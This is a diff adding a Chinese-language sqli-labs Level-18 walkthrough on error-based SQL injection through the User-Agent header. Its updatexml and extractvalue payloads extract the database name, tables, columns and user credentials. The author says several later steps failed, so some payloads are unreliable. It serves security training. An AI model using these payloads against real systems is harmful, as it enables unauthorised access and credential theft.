@@ -2371,3 +2371,111 @@ uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select reverse(group_c
 
 
 
+### Level-18
+
++ 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>网站第十八关
+
+![Less-18_1](./img/Less-18_1.PNG)
+
+
+
++ 用账号<code>dumb</code>和密码<code>dumb</code>测试，发现页面会展示<code>ip</code>地址和<code>user-agent</code>头
+
+![Less-18_3](./img/Less-18_3.PNG)
+
+
+
++ 判断闭合方式
+
+  + 在<code>Username</code>和<code>Password</code>上注入发现会被转义，无法注入
+  + 在<code>user-agent</code>上加上<code>'</code>会有报错
+
+  ![Less-18_5](./img/Less-18_5.PNG)
+
+  ![Less-18_6](./img/Less-18_6.PNG)
+
+  + 而在<code>user-agent</code>上加上<code>'and '1' = '1</code>，成功闭合
+
+  ![Less-18_7](./img/Less-18_7.PNG)
+
+![Less-18_8](./img/Less-18_8.png)
+
+![Less-18_9](./img/Less-18_9.PNG)
+
+
+
++ 爆库名
+
+~~~ shell
+两条语句均可用
+' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1
+' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1
+~~~
+
+![Less-18_7](./img/Less-18_7.PNG)
+
+![Less-18_10](./img/Less-18_10.PNG)
+
+![Less-18_11](./img/Less-18_11.PNG)
+
+成功爆出库名<code>security</code>
+
+
+
++ 爆表名
+
+~~~ shell
+insert into 'security'.'某个表'(uagent,ipadd,username) values('' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1','ip地址','用户名')
+
+'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema =database()),0x7e),1) and '1'='1
+
+'and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and '
+
+'and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and '
+~~~
+
+![Less-18_12](./img/Less-18_12.PNG)
+
+![Less-18_13](./img/Less-18_13.PNG)
+
+![Less-18_14](./img/Less-18_14.PNG)
+
+爆表出错，不知道什么原因
+
+
+
++ 爆列名
+
+~~~ shell
+'and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e)) and '
+~~~
+
+![Less-18_15](./img/Less-18_15.PNG)
+
+![Less-18_16](./img/Less-18_16.PNG)
+
+![Less-18_17](./img/Less-18_17.PNG)
+
+爆列名会出现错误，不知道什么原因
+
+
+
++ 爆数据
+
+~~~ shell
+' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1) and '1'='1
+~~~
+
+![Less-18_18](./img/Less-18_18.PNG)
+
+![Less-18_19](./img/Less-18_19.PNG)
+
+![Less-18_20](./img/Less-18_20.PNG)
+
+爆数据发生错误，不知道什么原因
+
+
+
+### Level-19
+
++ 
